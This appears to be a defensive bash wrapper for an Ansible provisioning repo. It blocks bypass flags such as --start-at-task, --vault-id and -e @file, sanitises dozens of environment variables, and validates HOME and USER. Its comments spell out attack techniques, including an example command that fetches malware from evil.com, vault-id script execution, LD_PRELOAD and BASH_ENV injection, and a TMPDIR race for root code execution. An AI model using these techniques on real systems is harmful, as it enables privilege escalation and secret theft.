#!/usr/bin/env bash
unset BASH_ENV  # SECURITY: prevent BASH_ENV=/tmp/evil.sh sourcing before sanitization runs
# SECURITY: Reject --start-at-task flag and other dangerous ansible-playbook flags
# to prevent bypassing pre-flight validation checks.
#
# Vulnerability: Ansible's --start-at-task skips pre_tasks (even with tags: [always]),
# allowing an attacker to bypass validation by running:
#   ansible-playbook site.yml --start-at-task '<task-name>' -e 'claude_install_url=https://evil.com/malware.sh'
#
# Defense-in-depth layers:
#   1. Makefile VERIFY_AND_RUN calls this script (Makefile layer — blocks direct users)
#   2. Arg scanner — rejects --start-at-task, --vault-password-file, --vault-id, --skip-tags=always, -e @file, _pf_is_molecule, _pf_vault_asserted, csb_rhel/_csb_molecule_force, system_sysctl_hardening, common_project_root (this script)
#   3. site.yml Play 0 has tags: [always] with pre-flight checks (Ansible layer)
#   4. site.yml Play 2 re-runs pre-flight checks (Ansible layer — survives --skip-tags always)
#   5. Each role's tasks/main.yml has a tags: [always] defense-in-depth assertion (role layer)
#   6. ENV sanitization — pins/clears 90+ vars: ANSIBLE_*, LD_*, PYTHON*, GIT_*, Go, Sigstore, socket/temp (env-injection layer)
#   7. HOME hijack check — validates HOME matches /etc/passwd before any path operations
#   8. verify-collections.sh — supply-chain integrity check before exec

set -euo pipefail
IFS=$'\n\t'  # SECURITY: reset IFS to safe value; prevents word-splitting bypass if a caller set IFS to a custom value before invoking this script

# SECURITY: Defense-in-depth against BASH_ENV/ENV/ZDOTDIR shell-init injection.
# The Makefile's 'unexport BASH_ENV ZDOTDIR ENV' is the load-bearing fix that prevents
# these vars from reaching this process in the first place. This unset prevents
# propagation to any child bash/sh/zsh processes spawned later in the script
# (e.g., verify-collections.sh, exec ansible-playbook wrapper scripts).
# NOTE: By the time this line runs the BASH_ENV payload has already executed if the
# variable was somehow inherited; this guard is strictly for child-process containment.
unset BASH_ENV ZDOTDIR ENV
unset CDPATH  # CDPATH injection: cd "scripts/.." searches CDPATH before CWD; poisons _repo_root and all downstream exports

# Collect all command-line arguments after the script name
args=("$@")

# Reject specific dangerous flags only
# NOTE: --tags and --skip-tags are NOT blocked globally — they're needed for role-specific
# make targets (make claude, make system, etc.). Only --start-at-task and --skip-tags always
# are blocked, as they specifically bypass pre-flight security checks.
for arg in "${args[@]}"; do
    # Block --start-at-task: skips pre_tasks entirely, bypassing all Play 0 security checks
    if [[ "$arg" == '--start-at-task' || "$arg" == --start-at-task=* || "$arg" == '--start-task' ]]; then
        cat >&2 <<EOF
ERROR: --start-at-task rejected by VERIFY_AND_RUN
Reason: --start-at-task skips pre_tasks (even with tags: [always] on Play 0),
        allowing bypass of ALL security assertions in pre_flight_checks.yml.

SECURITY RISK: Enables attacker to inject malicious values via -e without validation.
Solution: Use a scoped make target instead (make claude, make packages, make ssh, etc.)
EOF
        exit 1
    fi
    # Block --vault-password-file (single-arg = form)
    # ANSIBLE_VAULT_PASSWORD_FILE is already pinned; a CLI-supplied --vault-password-file
    # adds a second vault source and executes the named script as the invoking user before
    # the first task runs. No legitimate caller needs this flag.
    if [[ "$arg" == --vault-password-file=* ]]; then
        cat >&2 <<EOF
ERROR: --vault-password-file rejected by VERIFY_AND_RUN
Reason: ANSIBLE_VAULT_PASSWORD_FILE is already pinned to scripts/vault-pass.sh.
        A CLI-supplied --vault-password-file executes an additional script as the
        invoking user before any task runs, bypassing vault source controls.
SECURITY RISK: Arbitrary code execution via attacker-controlled vault password script.
Solution: Do not pass --vault-password-file on the command line.
EOF
        exit 1
    fi
    # Block --vault-id: Ansible 2.8+ vault-id unification executes the vault-id source
    # (e.g. --vault-id=attacker@/tmp/evil.py) as a subprocess alongside vault-pass.sh,
    # achieving code execution as the invoking user before the first task runs.
    # ANSIBLE_VAULT_PASSWORD_FILE does NOT suppress CLI-supplied vault-id sources; both execute.
    if [[ "$arg" == '--vault-id' || "$arg" == --vault-id=* ]]; then
        cat >&2 <<EOF
ERROR: --vault-id rejected by VERIFY_AND_RUN
Reason: Ansible 2.8+ vault-id unification executes the vault-id source script
        alongside vault-pass.sh before any task runs. --vault-id=attacker@/tmp/evil.py
        achieves code execution as the invoking user; ANSIBLE_VAULT_PASSWORD_FILE does
        not suppress CLI-supplied vault-id sources.
Solution: Vault decryption is handled by ANSIBLE_VAULT_PASSWORD_FILE (vault-pass.sh).
          Do not supply --vault-id on the command line.
EOF
        exit 1
    fi
    # Block --skip-tags=always (single-arg form with =); match always anywhere in comma-separated list
    if [[ "$arg" =~ ^--skip-tags=(.+,)?always(,.+)?$ ]]; then
        cat >&2 <<EOF
ERROR: --skip-tags=always rejected by VERIFY_AND_RUN
Reason: --skip-tags=always bypasses Play 2's [always]-tagged pre_tasks (vault
        healthcheck, CSB re-detection, identity assertions); Play 0 tasks are
        untagged and are NOT skipped by --skip-tags=always.
Solution: Do not use --skip-tags always with site.yml.
         Use a scoped make target instead (make claude, make packages, make ssh, etc.).
EOF
        exit 1
    fi
    # Block -e @file / --extra-vars=@file (single-arg =value and no-space forms)
    # Ansible's @file extra-vars syntax loads arbitrary YAML from the named file, bypassing
    # all per-variable checks below (a file can set _pf_vault_asserted, csb_rhel,
    # common_project_root, etc. in one flag). All legitimate callers pass key=value pairs.
    if [[ "$arg" == --extra-vars=@* || "$arg" == -e@* ]]; then
        cat >&2 <<EOF
ERROR: @file extra-vars rejected by VERIFY_AND_RUN
Reason: Ansible's @file syntax loads arbitrary YAML from a file, bypassing all
        per-variable guards (csb_rhel, _pf_vault_asserted, common_project_root,
        system_sysctl_hardening, etc.) in a single flag.
Solution: Pass key=value pairs directly instead of using a @file reference.
EOF
        exit 1
    fi
    # Block -e _pf_is_molecule=* / --extra-vars=_pf_is_molecule=* (single-arg =value form)
    # extra-vars (precedence 22) beats set_fact (18); pre-defining _pf_is_molecule=true
    # forces the flag permanently true, bypassing all 7 `when: not _pf_is_molecule` guards
    # in pre_flight_checks.yml for the entire play (vault checks, SSTI guard, URL validation).
    if [[ "$arg" == --extra-vars=_pf_is_molecule=* || "$arg" == -e_pf_is_molecule=* ]] || [[ "$arg" == --extra-vars=*_pf_is_molecule* ]]; then
        cat >&2 <<EOF
ERROR: -e _pf_is_molecule rejected by VERIFY_AND_RUN
Reason: Pre-defining _pf_is_molecule via extra-vars (precedence 22) overrides the
        set_fact (precedence 18) that derives it from the environment, permanently
        forcing it true and bypassing all 7 pre_flight_checks.yml security assertions.
Solution: Do not pass _pf_is_molecule as an extra-var.
EOF
        exit 1
    fi
    # Block -e _pf_vault_asserted=* / --extra-vars=_pf_vault_asserted=* (single-arg =value form)
    # Passing this via extra-vars (precedence 22) would pre-define the flag that gates the
    # vault_*/secret-key/security-policy assertions in pre_flight_checks.yml, silently skipping
    # all four checks and allowing vault_* keys in config.yml to shadow vault.yml undetected.
    if [[ "$arg" == --extra-vars=_pf_vault_asserted=* || "$arg" == -e_pf_vault_asserted=* ]] || [[ "$arg" == --extra-vars=*_pf_vault_asserted* ]]; then
        cat >&2 <<EOF
ERROR: -e _pf_vault_asserted rejected by VERIFY_AND_RUN
Reason: Pre-defining _pf_vault_asserted via extra-vars bypasses vault_* key detection,
        secret-key shadowing checks, claude security-policy checks, and the
        redhat_splunk_nologin_shell assertion in pre_flight_checks.yml.
Solution: Do not pass _pf_vault_asserted as an extra-var.
EOF
        exit 1
    fi
    # Block --extra-vars=csb_rhel=* and --extra-vars=_csb_molecule_force=* (single-arg = form)
    # extra-vars precedence 22 beats set_fact precedence 18; injecting these facts bypasses CSB
    # classification and silently skips hardening tasks (sysctl, cron, authselect, chrony, etc.)
    if [[ "$arg" == --extra-vars=csb_rhel=* || "$arg" == --extra-vars=_csb_molecule_force=* ]]; then
        cat >&2 <<EOF
ERROR: --extra-vars=csb_rhel= or --extra-vars=_csb_molecule_force= rejected by VERIFY_AND_RUN
Reason: these facts gate CSB/RHEL classification; injecting via --extra-vars silently
        disables hardening tasks (sysctl, cron, authselect, firmware, chrony) on Fedora.
SECURITY RISK: Misclassifies the host as RHEL CSB, bypassing the OS hardening stack.
Solution: Do not override csb_rhel or _csb_molecule_force on the command line.
EOF
        exit 1
    fi
    # Block any --extra-vars containing system_sysctl_hardening (key=value or JSON dict form)
    # extra-vars (precedence 22) beats set_fact (18); injecting system_sysctl_hardening replaces
    # the role-default hardening dict before the merge set_fact runs, AND remains authoritative
    # after it (22 > 18), so the deployed 90-hardening.conf silently drops all static entries.
    if [[ "$arg" == --extra-vars=*system_sysctl_hardening* ]]; then
        cat >&2 <<EOF
ERROR: --extra-vars=system_sysctl_hardening rejected by VERIFY_AND_RUN
Reason: extra-vars (precedence 22) overrides the role-default hardening dict and beats
        set_fact (18); the deployed /etc/sysctl.d/90-hardening.conf would contain only
        the injected keys, silently dropping kptr_restrict, dmesg_restrict, tcp_syncookies,
        and all other static hardening entries.
SECURITY RISK: Full erasure of sysctl hardening baseline on the provisioned host.
Solution: Do not override system_sysctl_hardening on the command line.
EOF
        exit 1
    fi
    # Block any --extra-vars containing common_project_root (key=value or JSON dict form)
    # extra-vars (precedence 22) beats set_fact (18); injecting common_project_root redirects
    # every include_tasks: "{{ common_project_root }}/..." to attacker-controlled task files,
    # silently bypassing SSTI guards, vault_* assertions, URL validation, and CSB classification.
    if [[ "$arg" == --extra-vars=*common_project_root* || "$arg" == -e*common_project_root* ]]; then
        cat >&2 <<EOF
ERROR: --extra-vars=common_project_root rejected by VERIFY_AND_RUN
Reason: extra-vars (precedence 22) override set_fact (18) and redirect all
        include_tasks: "{{ common_project_root }}/..." security checks to attacker-
        controlled task files, bypassing SSTI guards, vault_* key assertions, URL
        validation, and CSB classification across Play 0, Play 1, and Play 2.
SECURITY RISK: Empty YAML at attacker path silently passes all pre-flight checks.
Solution: Do not override common_project_root on the command line.
EOF
        exit 1
    fi
done

# Check for space-separated two-arg forms: --skip-tags always, -e _pf_vault_asserted=*, --extra-vars _pf_vault_asserted=*
# This requires scanning consecutive arg pairs since the loop above only sees individual args.
for ((i=0; i<${#args[@]}-1; i++)); do
    # Block space-separated: --vault-password-file /tmp/evil.py
    if [[ "${args[$i]}" == '--vault-password-file' ]]; then
        cat >&2 <<EOF
ERROR: --vault-password-file rejected by VERIFY_AND_RUN
Reason: ANSIBLE_VAULT_PASSWORD_FILE is already pinned to scripts/vault-pass.sh.
        A CLI-supplied --vault-password-file executes an additional script as the
        invoking user before any task runs, bypassing vault source controls.
SECURITY RISK: Arbitrary code execution via attacker-controlled vault password script.
Solution: Do not pass --vault-password-file on the command line.
EOF
        exit 1
    fi
    if [[ "${args[$i]}" == '--skip-tags' && "${args[$((i+1))]}" =~ (^|,)always(,|$) ]]; then
        cat >&2 <<EOF
ERROR: --skip-tags always rejected by VERIFY_AND_RUN
Reason: --skip-tags always bypasses Play 2's [always]-tagged pre_tasks (vault
        healthcheck, CSB re-detection, identity assertions); Play 0 tasks are
        untagged and are NOT skipped by --skip-tags=always.
Solution: Do not use --skip-tags always with site.yml.
         Use a scoped make target instead (make claude, make packages, make ssh, etc.).
EOF
        exit 1
    fi
    # Block space-separated two-arg --vault-id form: --vault-id attacker@/tmp/evil.py
    if [[ "${args[$i]}" == '--vault-id' ]]; then
        cat >&2 <<EOF
ERROR: --vault-id rejected by VERIFY_AND_RUN
Reason: Ansible 2.8+ vault-id unification executes the vault-id source script
        alongside vault-pass.sh before any task runs. --vault-id attacker@/tmp/evil.py
        achieves code execution as the invoking user; ANSIBLE_VAULT_PASSWORD_FILE does
        not suppress CLI-supplied vault-id sources.
Solution: Vault decryption is handled by ANSIBLE_VAULT_PASSWORD_FILE (vault-pass.sh).
          Do not supply --vault-id on the command line.
EOF
        exit 1
    fi
    # Block space-separated: -e @file and --extra-vars @file
    # @file loads arbitrary YAML, bypassing all per-variable guards in one flag.
    if [[ ( "${args[$i]}" == '-e' || "${args[$i]}" == '--extra-vars' ) && "${args[$((i+1))]}" == @* ]]; then
        cat >&2 <<EOF
ERROR: @file extra-vars rejected by VERIFY_AND_RUN
Reason: Ansible's @file syntax loads arbitrary YAML from a file, bypassing all
        per-variable guards (csb_rhel, _pf_vault_asserted, common_project_root,
        system_sysctl_hardening, etc.) in a single flag.
Solution: Pass key=value pairs directly instead of using a @file reference.
EOF
        exit 1
    fi
    # Block space-separated: -e _pf_is_molecule=<value> and --extra-vars _pf_is_molecule=<value>
    if [[ ( "${args[$i]}" == '-e' || "${args[$i]}" == '--extra-vars' ) && "${args[$((i+1))]}" == _pf_is_molecule=* ]] || [[ ( "${args[$i]}" == '-e' || "${args[$i]}" == '--extra-vars' ) && "${args[$((i+1))]}" == *_pf_is_molecule* ]]; then
        cat >&2 <<EOF
ERROR: -e _pf_is_molecule rejected by VERIFY_AND_RUN
Reason: Pre-defining _pf_is_molecule via extra-vars (precedence 22) overrides the
        set_fact (precedence 18) that derives it from the environment, permanently
        forcing it true and bypassing all 7 pre_flight_checks.yml security assertions.
Solution: Do not pass _pf_is_molecule as an extra-var.
EOF
        exit 1
    fi
    # Block space-separated: -e _pf_vault_asserted=<value> and --extra-vars _pf_vault_asserted=<value>
    if [[ ( "${args[$i]}" == '-e' || "${args[$i]}" == '--extra-vars' ) && "${args[$((i+1))]}" == _pf_vault_asserted=* ]] || [[ ( "${args[$i]}" == '-e' || "${args[$i]}" == '--extra-vars' ) && "${args[$((i+1))]}" == *_pf_vault_asserted* ]]; then
        cat >&2 <<EOF
ERROR: -e _pf_vault_asserted rejected by VERIFY_AND_RUN
Reason: Pre-defining _pf_vault_asserted via extra-vars bypasses vault_* key detection,
        secret-key shadowing checks, claude security-policy checks, and the
        redhat_splunk_nologin_shell assertion in pre_flight_checks.yml.
Solution: Do not pass _pf_vault_asserted as an extra-var.
EOF
        exit 1
    fi
    # Block space-separated: -e csb_rhel=<value>, --extra-vars csb_rhel=<value>,
    # -e _csb_molecule_force=<value>, --extra-vars _csb_molecule_force=<value>
    if [[ ( "${args[$i]}" == '-e' || "${args[$i]}" == '--extra-vars' ) && \
          ( "${args[$((i+1))]}" == csb_rhel=* || "${args[$((i+1))]}" == _csb_molecule_force=* || "${args[$((i+1))]}" == *csb_rhel* || "${args[$((i+1))]}" == *_csb_molecule_force* ) ]]; then
        cat >&2 <<EOF
ERROR: -e csb_rhel= or -e _csb_molecule_force= rejected by VERIFY_AND_RUN
Reason: these facts gate CSB/RHEL classification; injecting via -e silently
        disables hardening tasks (sysctl, cron, authselect, firmware, chrony) on Fedora.
SECURITY RISK: Misclassifies the host as RHEL CSB, bypassing the OS hardening stack.
Solution: Do not override csb_rhel or _csb_molecule_force on the command line.
EOF
        exit 1
    fi
    # Block space-separated: -e system_sysctl_hardening=* or JSON dict containing the key
    if [[ ( "${args[$i]}" == '-e' || "${args[$i]}" == '--extra-vars' ) && \
          "${args[$((i+1))]}" == *system_sysctl_hardening* ]]; then
        cat >&2 <<EOF
ERROR: -e system_sysctl_hardening rejected by VERIFY_AND_RUN
Reason: extra-vars (precedence 22) overrides the role-default hardening dict and beats
        set_fact (18); the deployed /etc/sysctl.d/90-hardening.conf would contain only
        the injected keys, silently dropping kptr_restrict, dmesg_restrict, tcp_syncookies,
        and all other static hardening entries.
SECURITY RISK: Full erasure of sysctl hardening baseline on the provisioned host.
Solution: Do not override system_sysctl_hardening on the command line.
EOF
        exit 1
    fi
    # Block space-separated: -e common_project_root=<value> or JSON dict containing the key
    if [[ ( "${args[$i]}" == '-e' || "${args[$i]}" == '--extra-vars' ) && \
          "${args[$((i+1))]}" == *common_project_root* ]]; then
        cat >&2 <<EOF
ERROR: -e common_project_root rejected by VERIFY_AND_RUN
Reason: extra-vars (precedence 22) override set_fact (18) and redirect all
        include_tasks: "{{ common_project_root }}/..." security checks to attacker-
        controlled task files, bypassing SSTI guards, vault_* key assertions, URL
        validation, and CSB classification across Play 0, Play 1, and Play 2.
SECURITY RISK: Empty YAML at attacker path silently passes all pre-flight checks.
Solution: Do not override common_project_root on the command line.
EOF
        exit 1
    fi
done

# Override or clear critical env vars to prevent environment-injection attacks.
# Key high-risk vectors (see also inline comments below for ANSIBLE_LIBRARY, ANSIBLE_FORCE_HANDLERS, ANSIBLE_BECOME_*, NSS_WRAPPER_*, TMPDIR, MOLECULE_*): — SET known-safe values; UNSET those that must be clean:
#   ANSIBLE_CONFIG              — evil cfg replaces all plugin paths + vault_password_file
#   ANSIBLE_VAULT_PASSWORD_FILE — redirects vault decryption to an exfiltration script
#   ANSIBLE_COLLECTIONS_PATH    — loads malicious collections (role 0 code execution)
#   ANSIBLE_ROLES_PATH          — loads malicious roles (arbitrary become code execution)
#   ANSIBLE_ACTION_PLUGINS      — action plugins run for every task; malicious = full intercept
#   ANSIBLE_STRATEGY_PLUGINS    — strategy plugin controls task dispatch; malicious = intercept all
#
#   PYTHONPATH                  — injected module shadows ansible.* at Python import time (CRITICAL)
#   ANSIBLE_PYTHON_INTERPRETER  — redirects Python used by Ansible to attacker binary
#
#   ANSIBLE_CACHE_PLUGIN*       — crafted facts cache plants spoofed ansible_distribution/ansible_fqdn,
#                                 skewing CSB detection (csb_detect.yml reads cached facts before gather)
#   ANSIBLE_INVENTORY           — malicious static inventory injects host_vars (e.g. ansible_python_interpreter)
#                                 that survive unset ANSIBLE_PYTHON_INTERPRETER (env ≠ host_var), executing
#                                 attacker-controlled Python as root via become tasks
#   ANSIBLE_INVENTORY_PLUGINS   — malicious inventory plugin injects host vars (e.g. ansible_python_interpreter)
#                                 that override connection defaults, executing attacker-controlled binary
#   ANSIBLE_VARS_PLUGINS        — vars plugins run before any play task at inventory/play precedence
#                                 (higher than group_vars); injects/overrides variables before
#                                 pre_flight_checks.yml runs, bypassing SSTI guards entirely
#
#   LD_PRELOAD                  — injects attacker .so into ansible-playbook Python process at exec() time;
#                                 hooks libc open()/read() to exfiltrate vault plaintext BEFORE sudo ever runs;
#                                 sudo env_reset strips it from become tasks but the user-context process
#                                 decrypts the vault first — that window is the attack surface
#   LD_LIBRARY_PATH             — redirects shared library resolution for Python + all subprocesses;
#                                 allows substituting libpython*.so or any dependency with a malicious copy
#   LD_AUDIT                    — silent rtld-audit hook (la_* interface) into every dynamic symbol call
#                                 in every process; more covert than LD_PRELOAD (no symbol replacement,
#                                 observation only) but sufficient to exfiltrate vault secrets
#
#   PYTHONHOME                  — completely replaces Python's stdlib search path before any Ansible code
#                                 runs; attacker sets PYTHONHOME=/tmp/evil, plants os.py/hashlib.py/
#                                 subprocess.py replacements — full Python interpreter redirection
#   PYTHONUSERSITE              — when "1", enables ~/.local/lib/pythonX.Y/site-packages; attacker
#                                 pre-seeds ~/.local/lib/python3.x/site-packages/ansible/ with
#                                 malicious modules that survive PYTHONPATH unset (different mechanism)
#   PYTHONSTARTUP               — executes named file before main script; CPython skips it for
#                                 non-interactive invocations (no tty), so practical risk is low,
#                                 but cleared for defence-in-depth

# SECURITY: Unset NSS_WRAPPER and linker injection vars BEFORE the getent HOME check.
# libnss_wrapper.so (invoked via LD_PRELOAD=libnss_wrapper.so NSS_WRAPPER_PASSWD=/tmp/evil)
# intercepts getent passwd and returns an attacker-controlled home directory entry, making
# HOME=/home/attacker appear valid. This poisons ANSIBLE_COLLECTIONS_PATH with an attacker
# path before exec. Unset these here so getent reads the real /etc/passwd.
# LD_PRELOAD/LD_LIBRARY_PATH/LD_AUDIT are also cleared here (early, before getent HOME check); the main sanitization block repeats this for defence-in-depth.
unset NSS_WRAPPER_PASSWD NSS_WRAPPER_GROUP
unset LD_PRELOAD LD_LIBRARY_PATH LD_AUDIT LD_DEBUG LD_DEBUG_OUTPUT LD_ORIGIN_PATH GLIBC_TUNABLES MALLOC_CONF
unset OPENSSL_CONF  # prevent attacker [provider_sect] loading a malicious .so into every OpenSSL-using process (Python ssl import, curl, gpg) before become:true strips env
unset BASH_ENV  # prevent BASH_ENV payload executing in vault-pass.sh: non-interactive bash reads BASH_ENV before set +x; cleared here before exec so it does not propagate to the vault password subprocess

_repo_root="$(cd "$(dirname "$0")/.." && pwd)"

# SECURITY: Remove any shell function definitions that may shadow system commands.
# BASH_ENV=/tmp/evil.sh is sourced before line 1 executes and can define functions such as
# `id() { echo "realuser"; }` and `getent() { printf 'realuser:x:1000::/home/attacker:\n'; }`.
# These shadow the real binaries and defeat the HOME and USER identity checks below.
# `unset NSS_WRAPPER_PASSWD` above only guards libc-level interception; it does NOT remove
# bash function definitions injected via BASH_ENV.
unset -f id getent cut awk command

# SECURITY: Validate HOME matches /etc/passwd to prevent home directory hijacking.
# An attacker setting HOME=/home/victim causes account_hardening.yml to chmod victim's home
# as root (become: true) and routes ANSIBLE_COLLECTIONS_PATH through victim's ~/.ansible.
_invoking_user="$(id -un)"
_passwd_home=""
if command -v getent &>/dev/null; then
    _passwd_home="$(getent passwd "${_invoking_user}" 2>/dev/null | cut -d: -f6)"
elif command -v dscl &>/dev/null; then
    _passwd_home="$(dscl . -read "/Users/${_invoking_user}" NFSHomeDirectory 2>/dev/null | awk '{print $2}')"
fi
if [[ -n "${_passwd_home}" && "${HOME}" != "${_passwd_home}" ]]; then
    cat >&2 <<EOF
ERROR: HOME mismatch — possible home directory hijack attempt
  HOME env var : ${HOME}
  Expected     : ${_passwd_home} (from /etc/passwd for ${_invoking_user})
Do not set HOME to another user's directory before running make all.
EOF
    exit 1
fi
# SECURITY: Validate USER matches id -un to prevent identity injection.
# An attacker setting USER=victim causes AllowUsers victim in the sshd drop-in,
# locking out the real user mid-play. id -un is kernel-sourced (getpwuid) and
# cannot be spoofed via environment variables.
if [[ -n "${USER:-}" && "$USER" != "$_invoking_user" ]]; then
    cat >&2 <<EOF
ERROR: USER env var does not match id -un — possible identity injection
  USER env var : ${USER}
  Expected     : ${_invoking_user} (from id -un)
Do not set USER to another user's identity before running make all.
EOF
    exit 1
fi
unset _invoking_user _passwd_home

export ANSIBLE_CONFIG="${_repo_root}/ansible.cfg"
export ANSIBLE_VAULT_PASSWORD_FILE="${_repo_root}/scripts/vault-pass.sh"
export ANSIBLE_VAULT_ID_MATCH=False  # prevent ANSIBLE_VAULT_ID_MATCH=true lockout: default encryption (ansible-vault encrypt) uses @default label; if an attacker sets ID_MATCH=true and label mismatches, all vault-sourced vars (SSH keys, authorized_keys, registry tokens) fail to decrypt — post-reboot host becomes SSH-inaccessible on port 722
export ANSIBLE_COLLECTIONS_PATH="${_repo_root}/collections:${HOME}/.ansible/collections:/usr/share/ansible/collections"
export ANSIBLE_ROLES_PATH="${_repo_root}/roles:${HOME}/.ansible/roles:/etc/ansible/roles"
export ANSIBLE_INVENTORY="${_repo_root}/inventory"  # pin inventory; host_var inject bypasses ANSIBLE_PYTHON_INTERPRETER unset
export ANSIBLE_ACTION_PLUGINS="${_repo_root}/action_plugins"
export ANSIBLE_STRATEGY_PLUGINS="${_repo_root}/strategy_plugins"
export ANSIBLE_HOME="${_repo_root}"  # pin ANSIBLE_HOME — ANSIBLE_HOME=/tmp/evil shifts DEFAULT_MODULE_UTILS_PATH to include /tmp/evil/plugins/module_utils before the installed package; Ansible's module loader searches that path first so a malicious basic.py at /tmp/evil/plugins/module_utils/ansible/module_utils/basic.py executes in root context (Play 1, become:true) for every ansible.builtin.* module across all 13 roles; pinning to _repo_root (validated, non-attacker-writable) prevents this prepend
export ANSIBLE_MODULE_UTILS=""       # clear ANSIBLE_MODULE_UTILS — direct env var for module_utils search path; an attacker-set value prepends /tmp/evil/module_utils before built-in paths at PluginLoader resolution time; clearing forces Ansible to use only compiled-in module_utils from the installed package, regardless of ANSIBLE_HOME
export ANSIBLE_LIBRARY=""         # prevent ANSIBLE_LIBRARY=/tmp/evil hijacking short-name module resolution (runs before builtins, become: true = root)
export ANSIBLE_FILTER_PLUGINS=""  # no local filter plugins; prevent shadowing built-ins (e.g. from_yaml) via env injection
export ANSIBLE_CONNECTION_PLUGINS=""  # prevent ANSIBLE_CONNECTION_PLUGINS=/tmp/evil hijacking: PluginLoader searches user paths before builtins; malicious local.py intercepts all localhost task execution (all 13 roles, including become:true plays)
export ANSIBLE_BECOME_PLUGINS=""      # prevent ANSIBLE_BECOME_PLUGINS=/tmp/evil loading a malicious sudo.py; ANSIBLE_BECOME_EXE pin alone does NOT protect — the plugin is a Python class loaded before build_become_command() runs; a malicious class ignores get_option('become_exe') entirely and constructs any root command string; plugin code also runs in the Ansible user-context process, giving arbitrary pre-become code execution
export ANSIBLE_TERMINAL_PLUGINS=""    # defence-in-depth; terminal plugins process connection output; unguarded path allows attacker hook into output stream
unset PYTHONPATH          # attacker-set PYTHONPATH can shadow ansible.* modules at import time
unset ANSIBLE_PYTHON_INTERPRETER  # attacker-controlled interpreter runs arbitrary code as Ansible
# SECURITY: clear ANSIBLE_INTERPRETER_PYTHON_FALLBACK — the ordered candidate list that
# discover_interpreter() walks under interpreter_python=auto_silent when no concrete
# ansible_python_interpreter is present in task_vars. For connection:local this is blocked
# by the inventory pin (ansible_python_interpreter: "{{ ansible_playbook_python }}")
# which causes get_config_value('INTERPRETER_PYTHON', variables=task_vars) to return a
# concrete path, never reaching discover_interpreter(). This unset is defence-in-depth:
# if the inventory pin were absent or circumvented, ANSIBLE_INTERPRETER_PYTHON_FALLBACK=
# "/tmp/evil python3" would cause Ansible to run /tmp/evil for module staging; with
# become:true, the evil interpreter controls AnsiballZ content fed to sudo → root RCE.
unset ANSIBLE_INTERPRETER_PYTHON_FALLBACK
unset LD_PRELOAD LD_LIBRARY_PATH LD_AUDIT LD_DEBUG LD_DEBUG_OUTPUT LD_ORIGIN_PATH GLIBC_TUNABLES MALLOC_CONF  # linker injection — .so hijacks user-context ansible-playbook before sudo strips it from become; GLIBC_TUNABLES/MALLOC_CONF inherited by SUID sudo (CVE-2023-4911 class)
unset NODE_OPTIONS NODE_PATH NPM_CONFIG_REGISTRY NPM_CONFIG_CACHE NPM_CONFIG_PREFIX  # Node/npm injection — NODE_OPTIONS=--require /tmp/evil.js loads into any npm/node child process (e.g. npx commitlint, future node tooling); NPM_CONFIG_REGISTRY/CACHE/PREFIX redirect package fetches or writes to attacker-controlled paths; defense-in-depth for ansible-playbook child processes (Makefile unexport is the load-bearing fix)
unset TMPDIR TEMP TMP  # TMPDIR redirection attack: attacker sets TMPDIR=/tmp/evil; Python tempfile.gettempdir() checks TMPDIR first, so Ansible AnsiballZ module staging writes .py files into attacker-controlled dir; inotifywait race replaces module between write and sudo exec, achieving root code execution
unset ANSIBLE_LOCAL_TEMP ANSIBLE_REMOTE_TEMP  # Ansible-specific tmp overrides: these env vars take precedence over local_tmp/remote_tmp ini pins in ansible.cfg (confirmed via ansible-config list); attacker sets ANSIBLE_LOCAL_TEMP=/var/tmp (exec-capable) to redirect AnsiballZ module staging to an attacker-writable path, enabling the same inotifywait race-condition root RCE described above — unset TMPDIR/TEMP/TMP does NOT guard against these Ansible-specific vars
export ANSIBLE_KEEP_REMOTE_FILES=0  # AnsiballZ secret retention: attacker pre-sets ANSIBLE_KEEP_REMOTE_FILES=1 before the user runs make all; Ansible then leaves AnsiballZ module zips in /tmp (mode 0600, provisioning user) after the play completes; the zips contain full task argument JSON including vault-decrypted content= values for SSH private keys, registry token stdin= args, and transcrypt password argv= args; no_log: true suppresses Ansible output but does not strip secrets from the AnsiballZ payload; pinning to 0 (Ansible default: do not keep) overrides any caller-inherited value before ansible-playbook is exec'd
unset PYTHONHOME PYTHONSTARTUP PYTHONINSPECT && export PYTHONNOUSERSITE=1  # Python runtime injection — PYTHONHOME replaces stdlib entirely; PYTHONNOUSERSITE=1 disables ~/.local site-packages (PYTHONUSERSITE is a no-op variable; PYTHONNOUSERSITE is the real CPython control); PYTHONSTARTUP low-risk for non-interactive but cleared for defence-in-depth; PYTHONINSPECT=1 (equiv -i) causes CPython to enter interactive REPL after ansible-playbook exits, hanging provisioning terminal/CI
unset PIP_BREAK_SYSTEM_PACKAGES PIP_INDEX_URL PIP_EXTRA_INDEX_URL PIP_CERT PIP_CONFIG_FILE PIP_REQUIRE_VIRTUALENV  # pip env-var sanitization — PIP_BREAK_SYSTEM_PACKAGES=1 bypasses PEP 668 externally-managed protection; if any task invokes system pip under become:true an attacker-preset value overwrites system Python packages enabling root-accessible code injection; PIP_INDEX_URL/PIP_EXTRA_INDEX_URL redirect package fetches to attacker-controlled index (dependency confusion); PIP_CERT/PIP_CONFIG_FILE inject attacker-controlled TLS trust or pip config; PIP_REQUIRE_VIRTUALENV=1 could block legitimate pip use in provisioning tasks
export ANSIBLE_INVENTORY_PLUGINS=""  # empty string forces compiled-in defaults only; prevents malicious inventory plugin from injecting host vars (e.g. ansible_python_interpreter) that bypass interpreter controls
export ANSIBLE_VARS_PLUGINS=""  # block vars plugin path hijacking — vars plugins run before any play task at higher precedence than group_vars; a malicious plugin can override claude_install_url, dotfiles_repo_url, or any config toggle before pre_flight_checks.yml executes, bypassing SSTI guards entirely
unset ANSIBLE_CACHE_PLUGIN ANSIBLE_CACHE_PLUGIN_CONNECTION ANSIBLE_CACHE_PLUGIN_TIMEOUT ANSIBLE_CACHE_PLUGIN_PREFIX  # facts-cache injection
unset ANSIBLE_GATHER_SUBSET  # gather_subset suppression: ANSIBLE_GATHER_SUBSET='!all,!any' produces an empty ansible_facts dict; repos_dnf when: ansible_facts['pkg_mgr'] raises AnsibleUndefinedVariable aborting Play 1; site.yml Set OS family facts uses ansible_facts['os_family'] with no default filter aborting Play 2; ssh role never runs, no authorized_keys is written, sshd restarts to port 722 — lockout; ANSIBLE_GATHER_SUBSET=all,!network removes ansible_fqdn; csb_detect.yml '| default("")' silently yields '' so _is_csb_hostname=False; on Fedora CSB hybrid (no fapolicyd) both detection paths fail, csb_detected=False, and hybrid-tier hardening is bypassed entirely
